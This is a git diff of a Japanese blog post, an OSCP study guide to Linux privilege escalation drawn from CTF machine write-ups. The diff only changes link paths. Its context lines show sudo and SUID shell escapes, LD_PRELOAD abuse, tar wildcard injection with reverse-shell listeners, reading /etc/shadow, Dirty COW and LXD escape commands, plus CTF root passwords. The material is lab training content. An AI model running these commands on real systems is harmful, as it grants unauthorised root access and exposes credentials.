@@ -1,12 +1,14 @@
 ---
 title: "Linux 権限昇格 — Writeup 分析まとめ（OSCP 対策版）"
 date: 2026-03-07
+permalink: /ja/posts/tech-linux-privesc-guide/
+legacy_permalink: /posts/tech-linux-privesc-guide-ja/
 description: "TryHackMe・HackTheBox・Proving Grounds の60件超のWriteupから抽出したLinux権限昇格の完全リファレンス。sudo悪用・SUID・Capabilities・Cronジョブ・カーネルエクスプロイト・LXD脱出まで、実機マシン事例とコマンド付きで網羅。"
 categories: [TechBlog]
 tags: [linux, privilege-escalation, suid, sudo, capabilities, cron, lxd, kernel-exploit, oscp, pentest, gtfobins]
 mermaid: true
 content_lang: ja
-alt_en: /posts/tech-linux-privesc-guide/
+alt_en: /en/posts/tech-linux-privesc-guide/
 ---
 
 ## TL;DR
@@ -161,17 +163,17 @@ sudo -l
 
 | バイナリ | コマンド | 確認マシン |
 |---|---|---|
-| `vim` | `sudo vim -c ':!/bin/bash'` または コマンドモードで `:!bash` | [Simple CTF](/posts/thm-simple-ctf/) |
-| `find` | `sudo find . -exec /bin/sh \; -quit` | [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/) |
-| `env` | `sudo env /bin/bash` | [Jordak](/posts/pg-jordak/) |
-| `nano` | `sudo nano` → `^R^X` → `reset; sh 1>&0 2>&0` | [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/) |
-| `less` | `sudo less /etc/passwd` → `!/bin/bash` | [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/) |
+| `vim` | `sudo vim -c ':!/bin/bash'` または コマンドモードで `:!bash` | [Simple CTF](/en/posts/thm-simple-ctf/) |
+| `find` | `sudo find . -exec /bin/sh \; -quit` | [Linux Privilege Escalation](/en/posts/thm-linux-privilege-escalation/) |
+| `env` | `sudo env /bin/bash` | [Jordak](/en/posts/pg-jordak/) |
+| `nano` | `sudo nano` → `^R^X` → `reset; sh 1>&0 2>&0` | [Linux Privilege Escalation](/en/posts/thm-linux-privilege-escalation/) |
+| `less` | `sudo less /etc/passwd` → `!/bin/bash` | [Linux Privilege Escalation](/en/posts/thm-linux-privilege-escalation/) |
 | `python` | `sudo python -c 'import os; os.system("/bin/bash")'` | 複数マシン |
-| `bash` | `sudo bash` | [StuxCTF](/posts/thm-stuxctf/) |
-| `wget` | `TF=$(mktemp); echo '#!/bin/sh\n/bin/bash' > $TF; chmod +x $TF; sudo wget --use-askpass=$TF http://127.0.0.1` | [HTB Sunday](/posts/htb-sunday/) |
-| `yum` | `TF=$(mktemp -d)` + プラグイン設定 → `sudo yum -c $TF/yum.conf` | [Daily Bugle](/posts/thm-daily-bugle/) |
-| `hping3` | `sudo hping3 --icmp target` → プロンプトで `/bin/sh -p` | [BBScute](/posts/pg-bbscute/) |
-| `strace` | `sudo strace -o /dev/null /bin/sh -p` | [Image](/posts/pg-image/)（SUID）|
+| `bash` | `sudo bash` | [StuxCTF](/en/posts/thm-stuxctf/) |
+| `wget` | `TF=$(mktemp); echo '#!/bin/sh\n/bin/bash' > $TF; chmod +x $TF; sudo wget --use-askpass=$TF http://127.0.0.1` | [HTB Sunday](/en/posts/htb-sunday/) |
+| `yum` | `TF=$(mktemp -d)` + プラグイン設定 → `sudo yum -c $TF/yum.conf` | [Daily Bugle](/en/posts/thm-daily-bugle/) |
+| `hping3` | `sudo hping3 --icmp target` → プロンプトで `/bin/sh -p` | [BBScute](/en/posts/pg-bbscute/) |
+| `strace` | `sudo strace -o /dev/null /bin/sh -p` | [Image](/en/posts/pg-image/)（SUID）|
 
 ```mermaid
 flowchart LR
@@ -196,7 +198,7 @@ sudo /opt/scripts/mysql-backup.sh
 # パスワードプロンプトにワイルドカード * を入力 → 比較バイパス
 ```
 
-実例: [HTB Codify](/posts/htb-codify/) — `mysql-backup.sh` がクォートなし bash 文字列比較を行っており、`*` でバイパスして root パスワードを取得。
+実例: [HTB Codify](/en/posts/htb-codify/) — `mysql-backup.sh` がクォートなし bash 文字列比較を行っており、`*` でバイパスして root パスワードを取得。
 
 ### 1c. LD_PRELOAD（env_keep）
 
@@ -220,7 +222,7 @@ gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
 sudo LD_PRELOAD=/tmp/shell.so find
 ```
 
-確認マシン: [TryHackMe Linux PrivEsc](/posts/thm-linux-privesc/)
+確認マシン: [TryHackMe Linux PrivEsc](/en/posts/thm-linux-privesc/)
 
 ### 1d. sudo service — パストラバーサル
 
@@ -234,7 +236,7 @@ sudo /usr/sbin/service ../../bin/bash
 
 `service` コマンドは最終的に `/etc/init.d/<引数>` を呼び出します。`../../bin/bash` を注入することで `/bin/bash` が root として実行されます。
 
-確認マシン: [Crane](/posts/pg-crane/)
+確認マシン: [Crane](/en/posts/pg-crane/)
 
 ---
 
@@ -269,7 +271,7 @@ find . -exec /bin/sh -p \; -quit
 # -p: 実効 UID を維持（root を保持）
 ```
 
-**`gdb` に SUID** ([Gaara](/posts/pg-gaara/)):
+**`gdb` に SUID** ([Gaara](/en/posts/pg-gaara/)):
 ```bash
 gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
 ```
@@ -279,12 +281,12 @@ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
 python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
-**`base64` に SUID** — root として任意のファイルを読み取り ([Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/)):
+**`base64` に SUID** — root として任意のファイルを読み取り ([Linux Privilege Escalation](/en/posts/thm-linux-privilege-escalation/)):
 ```bash
 base64 /etc/shadow | base64 --decode
 ```
 
-**`systemctl` に SUID** ([Jarvis](/posts/htb-jarvis/)):
+**`systemctl` に SUID** ([Jarvis](/en/posts/htb-jarvis/)):
 ```bash
 # 悪意のある systemd サービスユニットを作成
 TF=$(mktemp).service
@@ -298,12 +300,12 @@ systemctl enable --now $TF
 # その後: /bin/bash -p
 ```
 
-**`php` に SUID** ([Astronaut](/posts/pg-astronaut/)):
+**`php` に SUID** ([Astronaut](/en/posts/pg-astronaut/)):
 ```bash
 php -r 'pcntl_exec("/bin/sh", ["-p"]);'
 ```
 
-**`strace` に SUID** ([Image](/posts/pg-image/)):
+**`strace` に SUID** ([Image](/en/posts/pg-image/)):
 ```bash
 strace -o /dev/null /bin/sh -p
 # strace が root で動作（SUID）→ /bin/sh が root を継承
@@ -350,7 +352,7 @@ sequenceDiagram
 /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
-確認マシン: [Levram](/posts/pg-levram/)、[Katana](/posts/pg-katana/)
+確認マシン: [Levram](/en/posts/pg-levram/)、[Katana](/en/posts/pg-katana/)
 
 | Capability | 意味 |
 |---|---|
@@ -384,7 +386,7 @@ nc -nlvp 4444
 # Cron 実行を待つ → root シェル
 ```
 
-確認マシン: [GlasgowSmile](/posts/pg-glasgowsmile/)、[Law](/posts/pg-law/)
+確認マシン: [GlasgowSmile](/en/posts/pg-glasgowsmile/)、[Law](/en/posts/pg-law/)
 
 ### 4b. ワイルドカードインジェクション（tar）
 
@@ -405,7 +407,7 @@ touch -- '--checkpoint-action=exec=shell.elf'
 nc -nlvp 4444
 ```
 
-確認マシン: [TryHackMe Linux PrivEsc](/posts/thm-linux-privesc/)、[Cockpit](/posts/pg-cockpit/)、[Funboxeasyenum](/posts/pg-funboxeasyenum/)
+確認マシン: [TryHackMe Linux PrivEsc](/en/posts/thm-linux-privesc/)、[Cockpit](/en/posts/pg-cockpit/)、[Funboxeasyenum](/en/posts/pg-funboxeasyenum/)
 
 ```mermaid
 sequenceDiagram
@@ -442,7 +444,7 @@ nc -nlvp 4444
 # Cron 実行を待つ → root シェル
 ```
 
-確認マシン: [Overpass](/posts/thm-overpass/)
+確認マシン: [Overpass](/en/posts/thm-overpass/)
 
 ### 4d. Cron + 脆弱なツール（CVE 悪用）
 
@@ -463,7 +465,7 @@ nc -nlvp 4444
 # Cron 実行を待つ → root シェル
 ```
 
-確認マシン: [HTB Pilgrimage](/posts/htb-pilgrimage/)（binwalk CVE-2022-4510）
+確認マシン: [HTB Pilgrimage](/en/posts/htb-pilgrimage/)（binwalk CVE-2022-4510）
 
 ---
 
@@ -503,7 +505,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-確認マシン: [TryHackMe Linux PrivEsc](/posts/thm-linux-privesc/)、[Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/)
+確認マシン: [TryHackMe Linux PrivEsc](/en/posts/thm-linux-privesc/)、[Linux Privilege Escalation](/en/posts/thm-linux-privilege-escalation/)
 
 ---
 
@@ -538,7 +540,7 @@ gcc -g -c raptor_udf2.c -fPIC
 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 ```
 
-確認マシン: [TryHackMe Linux PrivEsc](/posts/thm-linux-privesc/)
+確認マシン: [TryHackMe Linux PrivEsc](/en/posts/thm-linux-privesc/)
 
 ---
 
@@ -568,7 +570,7 @@ cat /mnt/root/root/root.txt
 chroot /mnt/root /bin/bash   # ホストファイルシステムへの完全 root アクセス
 ```
 
-確認マシン: [HTB Tabby](/posts/htb-tabby/)
+確認マシン: [HTB Tabby](/en/posts/htb-tabby/)
 
 ```mermaid
 flowchart LR
@@ -608,7 +610,7 @@ chmod 600 id_rsa
 ssh -i id_rsa root@localhost
 ```
 
-確認マシン: [Extplorer](/posts/pg-extplorer/)、[Fanatastic](/posts/pg-fanatastic/)
+確認マシン: [Extplorer](/en/posts/pg-extplorer/)、[Fanatastic](/en/posts/pg-fanatastic/)
 
 ---
 
@@ -637,10 +639,10 @@ ssh root@localhost -p 22
 ```
 
 実例：
-- [Codo](/posts/pg-codo/): `/var/www/html/sites/default/config.php` → パスワード `FatPanda123` → `su root`
-- [Fired](/posts/pg-fired/): Openfire DB → パスワード → `su root`
-- [Btrsys2-1](/posts/pg-btrsys2-1/): `su -` で直接ログイン（パスワード `roottoor`）
-- [Mantis](/posts/pg-mantis/): pspy で `mysqldump` を検出 → パスワード → `sudo -l` で全権限
+- [Codo](/en/posts/pg-codo/): `/var/www/html/sites/default/config.php` → パスワード `FatPanda123` → `su root`
+- [Fired](/en/posts/pg-fired/): Openfire DB → パスワード → `su root`
+- [Btrsys2-1](/en/posts/pg-btrsys2-1/): `su -` で直接ログイン（パスワード `roottoor`）
+- [Mantis](/en/posts/pg-mantis/): pspy で `mysqldump` を検出 → パスワード → `sudo -l` で全権限
 
 ---
 
@@ -667,7 +669,7 @@ gcc -pthread c0w.c -o c0w
 # root シェル
 ```
 
-確認マシン: [TryHackMe Linux PrivEsc](/posts/thm-linux-privesc/)
+確認マシン: [TryHackMe Linux PrivEsc](/en/posts/thm-linux-privesc/)
 
 > **警告**: Dirty COW は本番システムでカーネルパニックやデータ破損を引き起こす可能性があります。ラボ・CTF 環境のみで使用してください。
 
@@ -778,29 +780,29 @@ flowchart TD
 
 | テクニック | マシン |
 |---|---|
-| sudo GTFOBins（vim/find/env/nano/less/bash）| [Simple CTF](/posts/thm-simple-ctf/)、[Jordak](/posts/pg-jordak/)、[StuxCTF](/posts/thm-stuxctf/)、[Linux PrivEsc](/posts/thm-linux-privilege-escalation/) |
-| sudo GTFOBins（wget/yum）| [HTB Sunday](/posts/htb-sunday/)、[Daily Bugle](/posts/thm-daily-bugle/) |
-| sudo GTFOBins（hping3/strace）| [BBScute](/posts/pg-bbscute/)、[Image](/posts/pg-image/) |
-| sudo service パストラバーサル | [Crane](/posts/pg-crane/) |
-| sudo 書き込み可能スクリプト | [HTB Codify](/posts/htb-codify/)、[HTB Nibbles](/posts/htb-nibbles/)、[Jarvis](/posts/htb-jarvis/) |
-| sudo LD_PRELOAD | [Linux PrivEsc](/posts/thm-linux-privesc/) |
-| SUID gdb | [Gaara](/posts/pg-gaara/) |
-| SUID php | [Astronaut](/posts/pg-astronaut/) |
-| SUID strace | [Image](/posts/pg-image/) |
-| SUID systemctl | [HTB Jarvis](/posts/htb-jarvis/) |
-| SUID base64 | [Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/) |
-| SUID find / カスタムラッパー | [Nibbles (PG)](/posts/pg-nibbles/)、[Mzeeav](/posts/pg-mzeeav/) |
-| cap_setuid python | [Levram](/posts/pg-levram/)、[Katana](/posts/pg-katana/) |
-| Cron 書き込み可能スクリプト | [GlasgowSmile](/posts/pg-glasgowsmile/)、[Law](/posts/pg-law/)、[Ochima](/posts/pg-ochima/)、[Funbox](/posts/pg-funbox/)、[Flu](/posts/pg-flu/)、[HTB Solidstate](/posts/htb-solidstate/) |
-| Cron ワイルドカード（tar）| [Linux PrivEsc](/posts/thm-linux-privesc/)、[Cockpit](/posts/pg-cockpit/)、[Funboxeasyenum](/posts/pg-funboxeasyenum/) |
-| Cron DNS ハイジャック | [Overpass](/posts/thm-overpass/) |
-| Cron + ツール CVE（binwalk）| [HTB Pilgrimage](/posts/htb-pilgrimage/) |
-| disk グループ + debugfs | [Extplorer](/posts/pg-extplorer/)、[Fanatastic](/posts/pg-fanatastic/) |
-| 設定ファイル認証情報再利用 | [Codo](/posts/pg-codo/)、[Fired](/posts/pg-fired/)、[Btrsys2-1](/posts/pg-btrsys2-1/)、[Mantis](/posts/pg-mantis/) |
-| LXD コンテナ脱出 | [HTB Tabby](/posts/htb-tabby/) |
-| MySQL UDF | [Linux PrivEsc](/posts/thm-linux-privesc/) |
-| カーネル（Dirty COW）| [Linux PrivEsc](/posts/thm-linux-privesc/)、[Driftingblue6](/posts/pg-driftingblue6/) |
-| パスワードハッシュクラック | [Linux PrivEsc](/posts/thm-linux-privesc/)、[Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/) |
+| sudo GTFOBins（vim/find/env/nano/less/bash）| [Simple CTF](/en/posts/thm-simple-ctf/)、[Jordak](/en/posts/pg-jordak/)、[StuxCTF](/en/posts/thm-stuxctf/)、[Linux PrivEsc](/en/posts/thm-linux-privilege-escalation/) |
+| sudo GTFOBins（wget/yum）| [HTB Sunday](/en/posts/htb-sunday/)、[Daily Bugle](/en/posts/thm-daily-bugle/) |
+| sudo GTFOBins（hping3/strace）| [BBScute](/en/posts/pg-bbscute/)、[Image](/en/posts/pg-image/) |
+| sudo service パストラバーサル | [Crane](/en/posts/pg-crane/) |
+| sudo 書き込み可能スクリプト | [HTB Codify](/en/posts/htb-codify/)、[HTB Nibbles](/en/posts/htb-nibbles/)、[Jarvis](/en/posts/htb-jarvis/) |
+| sudo LD_PRELOAD | [Linux PrivEsc](/en/posts/thm-linux-privesc/) |
+| SUID gdb | [Gaara](/en/posts/pg-gaara/) |
+| SUID php | [Astronaut](/en/posts/pg-astronaut/) |
+| SUID strace | [Image](/en/posts/pg-image/) |
+| SUID systemctl | [HTB Jarvis](/en/posts/htb-jarvis/) |
+| SUID base64 | [Linux Privilege Escalation](/en/posts/thm-linux-privilege-escalation/) |
+| SUID find / カスタムラッパー | [Nibbles (PG)](/en/posts/pg-nibbles/)、[Mzeeav](/en/posts/pg-mzeeav/) |
+| cap_setuid python | [Levram](/en/posts/pg-levram/)、[Katana](/en/posts/pg-katana/) |
+| Cron 書き込み可能スクリプト | [GlasgowSmile](/en/posts/pg-glasgowsmile/)、[Law](/en/posts/pg-law/)、[Ochima](/en/posts/pg-ochima/)、[Funbox](/en/posts/pg-funbox/)、[Flu](/en/posts/pg-flu/)、[HTB Solidstate](/en/posts/htb-solidstate/) |
+| Cron ワイルドカード（tar）| [Linux PrivEsc](/en/posts/thm-linux-privesc/)、[Cockpit](/en/posts/pg-cockpit/)、[Funboxeasyenum](/en/posts/pg-funboxeasyenum/) |
+| Cron DNS ハイジャック | [Overpass](/en/posts/thm-overpass/) |
+| Cron + ツール CVE（binwalk）| [HTB Pilgrimage](/en/posts/htb-pilgrimage/) |
+| disk グループ + debugfs | [Extplorer](/en/posts/pg-extplorer/)、[Fanatastic](/en/posts/pg-fanatastic/) |
+| 設定ファイル認証情報再利用 | [Codo](/en/posts/pg-codo/)、[Fired](/en/posts/pg-fired/)、[Btrsys2-1](/en/posts/pg-btrsys2-1/)、[Mantis](/en/posts/pg-mantis/) |
+| LXD コンテナ脱出 | [HTB Tabby](/en/posts/htb-tabby/) |
+| MySQL UDF | [Linux PrivEsc](/en/posts/thm-linux-privesc/) |
+| カーネル（Dirty COW）| [Linux PrivEsc](/en/posts/thm-linux-privesc/)、[Driftingblue6](/en/posts/pg-driftingblue6/) |
+| パスワードハッシュクラック | [Linux PrivEsc](/en/posts/thm-linux-privesc/)、[Linux Privilege Escalation](/en/posts/thm-linux-privilege-escalation/) |
 
 ---
 
@@ -822,5 +824,5 @@ flowchart TD
 - [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
 - [CVE-2016-5195 (Dirty COW)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195)
 - [CVE-2022-4510（binwalk RCE）](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4510)
-- **関連 Writeup**: [Simple CTF](/posts/thm-simple-ctf/)、[Gaara](/posts/pg-gaara/)、[Levram](/posts/pg-levram/)、[Katana](/posts/pg-katana/)、[Jordak](/posts/pg-jordak/)、[GlasgowSmile](/posts/pg-glasgowsmile/)、[Law](/posts/pg-law/)、[Ochima](/posts/pg-ochima/)、[Funbox](/posts/pg-funbox/)、[Overpass](/posts/thm-overpass/)、[BBScute](/posts/pg-bbscute/)、[Crane](/posts/pg-crane/)、[Astronaut](/posts/pg-astronaut/)、[Image](/posts/pg-image/)、[Extplorer](/posts/pg-extplorer/)、[Fanatastic](/posts/pg-fanatastic/)、[Codo](/posts/pg-codo/)、[Mantis](/posts/pg-mantis/)、[Driftingblue6](/posts/pg-driftingblue6/)、[Linux PrivEsc](/posts/thm-linux-privesc/)、[Linux Privilege Escalation](/posts/thm-linux-privilege-escalation/)、[HTB Tabby](/posts/htb-tabby/)、[HTB Jarvis](/posts/htb-jarvis/)、[HTB Codify](/posts/htb-codify/)、[HTB Pilgrimage](/posts/htb-pilgrimage/)、[HTB Sunday](/posts/htb-sunday/)、[Daily Bugle](/posts/thm-daily-bugle/)
-- **関連技術記事**: [SUID find 詳細解説](/posts/tech-suid-find-privesc/)
+- **関連 Writeup**: [Simple CTF](/en/posts/thm-simple-ctf/)、[Gaara](/en/posts/pg-gaara/)、[Levram](/en/posts/pg-levram/)、[Katana](/en/posts/pg-katana/)、[Jordak](/en/posts/pg-jordak/)、[GlasgowSmile](/en/posts/pg-glasgowsmile/)、[Law](/en/posts/pg-law/)、[Ochima](/en/posts/pg-ochima/)、[Funbox](/en/posts/pg-funbox/)、[Overpass](/en/posts/thm-overpass/)、[BBScute](/en/posts/pg-bbscute/)、[Crane](/en/posts/pg-crane/)、[Astronaut](/en/posts/pg-astronaut/)、[Image](/en/posts/pg-image/)、[Extplorer](/en/posts/pg-extplorer/)、[Fanatastic](/en/posts/pg-fanatastic/)、[Codo](/en/posts/pg-codo/)、[Mantis](/en/posts/pg-mantis/)、[Driftingblue6](/en/posts/pg-driftingblue6/)、[Linux PrivEsc](/en/posts/thm-linux-privesc/)、[Linux Privilege Escalation](/en/posts/thm-linux-privilege-escalation/)、[HTB Tabby](/en/posts/htb-tabby/)、[HTB Jarvis](/en/posts/htb-jarvis/)、[HTB Codify](/en/posts/htb-codify/)、[HTB Pilgrimage](/en/posts/htb-pilgrimage/)、[HTB Sunday](/en/posts/htb-sunday/)、[Daily Bugle](/en/posts/thm-daily-bugle/)
+- **関連技術記事**: [SUID find 詳細解説](/en/posts/tech-suid-find-privesc/)
